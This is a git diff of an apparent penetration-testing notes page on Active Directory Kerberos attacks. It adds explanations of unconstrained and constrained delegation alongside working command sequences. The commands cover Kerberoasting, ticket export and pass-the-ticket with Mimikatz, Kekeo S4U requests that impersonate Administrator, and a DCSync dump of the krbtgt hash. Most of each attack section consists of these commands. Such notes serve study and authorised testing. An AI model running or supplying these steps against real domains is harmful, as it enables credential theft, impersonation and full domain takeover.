@@ -115,14 +115,155 @@ Get-ADUser -Identity user1 -properties ServicePrincipalName | select ServicePrin
 Using AD Module\
 Set-ADuser -identity user1 -serviceprincipalname @{Add='nameyour/spn'}
 
-**4. Request a TGS for the SPN**\
-Add-Type -AssemblyName System.IdentityModel\
+**4. Request a TGS for the SPN**
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "nameyour/spn"
+```
+
+`Add-Type -AssemblyName System.IdentityModel`\
+`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "nameyour/spn"`
 
 **3. Check if TGS in memory & save it to disk**\
-klist\
-Invoke-Mimikatz -Command '"kerberos::list /export"'
+`klist`\
+`Invoke-Mimikatz -Command '"kerberos::list /export"'`
 
 **4. Crack it with John/Hashcat/tsrepcrack**\
-python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
+`python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport`
+
+
+
+## 🎭 Kerberos Delegation / Impersonation
+
+### Description
+
+* Kerberos Delegation allows the "reuse end-user credentials to access resoruce hosted on a different server"
+* Is typically useful in multi-tier service or applications where Kerberos Double Hop is reuquired\
+  Double Hop: First Hop is where the user authenticates to, is not allowed to delegate the credentials somewhere else.&#x20;
+* For example: A user authenticates to a websserver and the webserver makes a request to a DB server. The webserver can request access to resources (all or some resources, dependending on the delegation) on the DB server as the user - not with the service account from the webserver => Impersonating the user and the webserver can act as the user on the DB server.\
+  Note: The service account for the web service must be trusted fordelegation to be able to request as a user
+* Unconstrained Delegation: The Server can connect to any resource in the domain, using the authenticated user account
+* Two Types of Kerberos Delegation
+  * &#x20;1\. Unconstrained Delegation or General/Basic D. - allows the first hop server to request access to any service on any host in the domain as the user
+  * &#x20;2\. Constrained Delegation - allows the first hop server to request access only to specified services on specific computers. If the user is not using Kerberos authentication to auth to the first hop server, Windows offers Protocol Transistoin to transit to the request to kerberos
+* Unconstrained Delegation:
+  * Allows the first hop server to request access only to specified services on specific computers.
+  * When UD is enabled, the DC places user's TGT inside TGS,  see step 4. When presented to the server with UD, the TGT is extracted from TGS and stored in LSASS. So the server can reuse the users TGT to access resources.
+  * This could be used to escalate privileges in case we can compromise the computer with UD and a Domain Admin connects to that machine
+
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+After Step 6, the DC checks, if the User is marked as "Account is sensitive and cannot be delegated". If so, the DC wont allow the access.
+
+[https://learn.microsoft.com/de-de/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts](https://learn.microsoft.com/de-de/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts)
+{% endhint %}
+
+Note: &#x20;
+
+### Requirement
+
+* The service account of e.g. Webserver must be trusted for delegation to be able to make requests as a user
+* The user must not be marked as "Account is sensitive and cannot be delegated".
+* Maybe you have to wait until some interesting users connect
+
+### Tool
+
+**1. Discover domain hosts (e.g machine account) which have unconstrained delegation using PowerView (Note: DC will always show up)**
+
+```powershell
+Get-NetComputer -UnConstrained
+```
+
+Using AD Module
+
+```powershell
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+Get-AD-User -Filter {TrustedForDelegation -eq $true}
+```
+
+❓ Elevated/System priv. required or high integrity process!
+
+**2. Compromise the server where Unconstrained Delegation is enabled and get all the Kerberos Tokens (wait for admin user to connect?)**
+
+```powershell
+Invoke-Mimikatz -command '"sekurlsa::ticket"'
+Invoke-Mimikatz -command '"sekurlsa::ticket /export"'  //saves it to the disk - then ls | select name
+```
+
+**3. Reuse the token** \
+Invoke-Mimikatz -command '"kerberos::ptt C:\path\to\ticket"'
+
+
+
+## ↙🎭 Kerberos Constrained Delegation&#x20;
+
+### Description
+
+* When CD is enabled on a service account, it allows only to specified services on a specific host as the user
+* To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
+  * Service for User to Self (S4U2self) - Allows a service to obtain a forwordable TGS to itself on behalf of a user, with just the user principal name without supplying a password. The service account mut have TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGTION (T2A4D) UserAccount attribute must be set for the service account. Only then the service can request a TGS for itself on behalf of the user by impersonating the user
+  * Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute of the service account. This attribute contains a list of SPNs to which the user tokens can be forwarded.
+* Delegation not only occurs for the specified service but for any service running under the same account. There is no validation for the SPN specified.\
+  This is huge as it allows to many interesting services when the delegation may be for a non-intrusive service!\
+  ❗Eg. We have CIFS on appsrv.dom.local, we can access all the services, which use the same service account as CIFS, which is the machine account. This is also the account for WMI, PowershellRemoting!
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+### Requirement
+
+* Access to the service account - it is then possible to access services listed in the msDS-AllowedToDelegateTo as _**ANY**_ user, including Domain Administrators
+* No waiting
+* Compromised machine with high privileges shell or request a TGT for the machine account
+
+### Tool&#x20;
+
+&#x20;**1. Enumerate users and computers with constrained delegation enabled - with PowerView**
+
+```powershell
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+```
+
+With ActiveDirectory Module
+
+```powershell
+Get-ADObject -filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTO
+```
+
+**2. Using plaintext password of NTLM hash of the service account to request a TGT using asktgt from Kekeo (Step 2 & 3 in diagram)**
+
+<pre><code><strong>.\kekeo.exe
+</strong><strong>kekeo# tgt::ask /user:serviceusername /domain:dom.local /rc4:rc4hash
+</strong></code></pre>
+
+Kekeo can read/write tickets without injecting into lsass and without having adminprivileges.
+
+**3. Once we have t TGT,  using s4u from keko, we can request a TGS (step 4 and 5 in diagram)**
+
+```
+kekeo# s4u /tgt:filename.kirbi /user:administrator@dom.local /service:full_service_name
+```
+
+**4. Inject the TGS ticket in the current session**&#x20;
+
+```powershell
+Invoke-Mimikatz -command '"kerberos::ptt filename_to_tgs_from_kekeo.kirbi"'
+ls \\dom.local\c$
+```
+
+5\.  Using asktgt from Kekeo, we request a TGT and then a TGS
+
+```powershell
+tgt::ask /user:usernae$ /domain:dom.local /rc4:rc4here
+
+tgs::s4u /tgt:filename.kirbi /user:Administrator@dom.local /service:time/dom.local|ldap/dom.local
+=> We also request LDAP Access as Administrator, which runs under the same service account as the regular time service
+```
+
+```
+Invoke-Mimikatz -command '"kerberos::ptt filename.kirbi"'
+Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
+```
 
